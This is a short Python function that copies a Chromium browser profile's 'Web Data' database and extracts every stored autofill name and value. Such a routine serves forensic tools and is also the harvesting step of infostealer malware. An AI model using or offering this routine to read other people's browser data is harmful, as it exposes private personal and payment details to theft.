import os, sqlite3, shutil

def get_autofill(profile_path):
    path = os.path.join(profile_path, "Web Data")
    if not os.path.exists(path): return []
    temp_db = "autofill_tmp"
    shutil.copyfile(path, temp_db)
    results = []
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        # Query for names and values from the autofill table
        cursor.execute("SELECT name, value FROM autofill")
        results = cursor.fetchall()
        conn.close()
    finally:
        if os.path.exists(temp_db): os.remove(temp_db)
    return results